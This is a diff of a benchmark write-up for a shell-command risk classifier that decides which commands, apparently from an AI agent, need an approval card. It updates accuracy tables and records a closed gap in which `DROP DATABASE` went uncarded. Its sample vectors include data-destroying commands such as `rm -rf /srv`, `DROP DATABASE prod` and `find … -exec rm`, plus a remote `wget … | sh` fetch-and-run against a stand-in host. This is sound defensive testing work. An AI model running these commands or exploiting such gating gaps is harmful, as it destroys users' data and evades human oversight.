@@ -46,7 +46,7 @@ from `apps/sidecar/src/normalize.ts` — with no mocks.
   the strict leak gate over the rest of the tree stays hole-free.
 
 Corpus size: **38 redaction positives** across **29 kind families**, **28 hard negatives**, and
-**80 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
+**81 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
 Git shell-alias, dynamic-executable, redirect-placement adversarial forms, and one shape from each
 classifier audit round since the sixth — remote-runner substitution, heredoc bodies, compound
 statements, quoted assignments, ANSI-C and `$$` quoting, unterminated heredocs, command-word
@@ -146,7 +146,7 @@ metric RED.
 ## Results — risk classifier
 
 Measured against `classifyCommandWithCategories` (`apps/sidecar/src/normalize.ts`).
-Classifier results below were regenerated on 2026-08-26.
+Classifier results below were regenerated on 2026-08-28.
 
 **Scope.** This benchmarks the **command-pattern** categories the classifier derives from the
 command string: `recursive-rm`, `disk-destroy`, `history-rewrite`, `db-drop`, `fork-bomb`,
@@ -159,13 +159,13 @@ the tool input (not from the command string alone) and are **out of scope** for 
 | recursive-rm      | 25      | 100.0%    | 100.0%     |
 | disk-destroy      | 4       | 80.0%     | 100.0%     |
 | history-rewrite   | 8       | 100.0%    | 100.0%     |
-| db-drop           | 3       | 75.0%     | 100.0%     |
+| db-drop           | 4       | 80.0%     | 100.0%     |
 | fork-bomb         | 1       | 100.0%    | 100.0%     |
 | perm-change       | 5       | 100.0%    | 100.0%     |
 | inline-code       | 13      | 100.0%    | 100.0%     |
 | migrate-prod      | 2       | 50.0%     | 100.0%     |
 | high-risk-other   | 1       | 11.1%     | 100.0%     |
-| **micro-average** | 62      | **83.8%** | **100.0%** |
+| **micro-average** | 63      | **84.0%** | **100.0%** |
 
 **Recall is 100% on every category** — nothing dangerous in the corpus slips past the classifier.
 Read that as a statement about _this corpus_, not a general guarantee: the corpus is only as good as
@@ -195,11 +195,13 @@ than over-gating (an extra approval prompt)**, so ambiguous cases fail toward "g
 
 | Policy                              | Precision | Recall | TP / FP / FN / TN |
 | ----------------------------------- | --------- | ------ | ----------------- |
-| default-gated (out-of-box)          | 96.0%     | 100.0% | 48 / 2 / 0 / 30   |
-| strict-all (every category enabled) | 93.2%     | 100.0% | 55 / 4 / 0 / 21   |
+| default-gated (out-of-box)          | 96.1%     | 100.0% | 49 / 2 / 0 / 30   |
+| strict-all (every category enabled) | 93.3%     | 100.0% | 56 / 4 / 0 / 21   |
 
-- Risk-level exact-match accuracy: **91.3%**.
-- Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **98.2%**.
+- Risk-level exact-match accuracy: **92.6%**.
+- Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **100.0%**.
+  (Before 2026-08-28 this was 98.2%: `DROP DATABASE` was the one dangerous vector the risk verdict
+  rated `low`; it is now `high`, see the calibration notes.)
 
 Under the out-of-box `DEFAULT_GATED_CATEGORIES`, `inline-code` is **on by default** alongside the
 catastrophic categories: interpreter-mediated operations are held even when the classifier cannot
@@ -209,15 +211,16 @@ their noisier keyword matches therefore do not affect default-gated precision.
 ### Divergences from human labels (findings / calibration notes)
 
 The harness prints every divergence: twelve **category** divergences, listed in full in this table,
-and seven **risk-level** divergences, listed in full under "Risk-level calibration notes" below (an
+and six **risk-level** divergences, listed in full under "Risk-level calibration notes" below (an
 earlier revision listed four category rows of ten and claimed the table was complete; it was not).
 All category false positives are **safe-direction over-gates**. Four come from whole-command keyword
 literals; eight are the `high-risk-other` marker — the classifier's "this segment could not be
 analysed" floor — riding alongside a named category that _is_ correct, which is why that category's
-precision (11.1%) is the lowest in the table above. No category divergence loses a label. Three of
-the risk divergences do rate a vector _below_ its human label (`find … -exec rm`, `DROP DATABASE`,
-and the remote pipe-to-shell); each is called out below, and every one of them is still carded in
-at least one mode.
+precision (11.1%) is the lowest in the table above. No category divergence loses a label. Two of
+the risk divergences do rate a vector _below_ its human label (`find … -exec rm` and the remote
+pipe-to-shell); each is called out below, and both are still carded in every mode (`medium`, not
+`low`). `DROP DATABASE`, which an earlier revision listed here as a third under-rating, is now
+rated `high` (see the calibration notes).
 
 | Command                                            | Divergence                                                     | Nature                                                                                                                                                                                             |
 | -------------------------------------------------- | -------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -234,20 +237,20 @@ at least one mode.
 | `cat <<EOF` … `don't $(rm -rf /srv) isn't` … `EOF` | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An unquoted heredoc body expands `$(…)`; the expanded substitution is surfaced as its own segment whose only token is the raw substitution, and that segment draws the marker (audit R10 H2).      |
 | empty backtick substitution before `rm -rf /srv`   | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An empty substitution in the command-word position cannot name a program statically; the flattened form supplies `recursive-rm`, the unanalyzable word supplies the marker (audit R11 SEC-CQ11-1). |
 
-Risk-level calibration notes — all seven risk-level divergences. The count and the presence of
+Risk-level calibration notes — all six risk-level divergences. The count and the presence of
 every command below are pinned by `inv-safety-bench-published.test.ts` against the live bench, so
-this list can no longer fall behind the harness (an earlier revision listed three of the seven
-while calling itself complete):
+this list can no longer fall behind the harness (an earlier revision listed three of the then
+seven while calling itself complete):
 
-- `psql -c 'DROP DATABASE prod'` classifies as risk `low` while the `db-drop` **category still
-  fires**. An earlier revision of this document called that "not a safety gap" and said the gate
-  still holds it. That is only half true, and the half it gets wrong is the ordinary case: the
-  bypass/YOLO gate is category-driven and does hold it, but ordinary approval keys off the risk
-  verdict alone, so under normal (non-bypass) operation this command produces **no approval card**.
-  An audit round in August 2026 rated the same mechanism H where it appeared elsewhere, so it is
-  recorded here as a real gap rather than a calibration note. `DROP TABLE` and `TRUNCATE` rate
-  `high` and are carded normally; `DROP DATABASE` — the least reversible of the three — is the one
-  that slips, which is the wrong way round. Tracked for correction rather than left implicit.
+- **Closed (2026-08-28):** `psql -c 'DROP DATABASE prod'` used to classify as risk `low` while the
+  `db-drop` category still fired. The bypass/YOLO gate is category-driven and did hold it, but
+  ordinary approval keys off the risk verdict alone, so under normal (non-bypass) operation this
+  command produced **no approval card** — `DROP TABLE` and `TRUNCATE` were carded, and the least
+  reversible of the three was the one that slipped. The literal now rates `high` (and the
+  PostgreSQL CLI form `dropdb` is a new `high` / `db-drop` literal), so it is carded in every mode;
+  `INV-DB-DROP-RISK-VERDICT` pins both the verdict and the bridge-level card. The cost is the same
+  keyword false positive already accepted for `DROP TABLE`: a search argument such as
+  `grep -rn 'DROP DATABASE' migrations/` now draws a card too (safe-direction over-gate).
 - `find /var/tmp -type f -exec rm {} ;` classifies as `medium` rather than `high`; it is still
   gated (`recursive-rm`).
 - `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
